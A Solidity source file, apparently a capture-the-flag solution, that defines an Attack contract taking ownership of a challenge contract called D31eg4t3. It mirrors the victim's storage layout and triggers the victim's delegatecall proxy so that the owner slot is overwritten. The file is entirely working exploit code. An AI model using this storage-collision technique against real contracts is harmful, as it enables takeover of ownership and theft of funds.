// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;

    // We also need to declare state variables that match the storage layout of D31eg4t3
    uint256 internal placeholder0; // matches var0 in D31eg4t3
    uint8 internal placeholder1;   // matches var1 in D31eg4t3
    string internal placeholder2;  // matches var2 in D31eg4t3
    address internal placeholder3; // matches var3 in D31eg4t3
    uint8 internal placeholder4;   // matches var4 in D31eg4t3
    address public owner;          // this should align with owner variable in D31eg4t3

    constructor(address addr) payable {
        victim = addr;
        owner = msg.sender; // Initialize owner as the deployer; necessary due to Solidity's checks on uninitialized storage
    }

    function changeOwner(address newOwner) external {
        // This function will overwrite the owner storage slot in the victim contract if called with delegatecall
        owner = newOwner;
    }

    function exploit() external {
        // Craft the calldata for the changeOwner function
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        
        // Make the proxy call to delegatecall to the victim contract
        (bool success, ) = victim.call(abi.encodeWithSignature("proxyCall(bytes)", data));
        require(success, "Exploit failed");
    }
}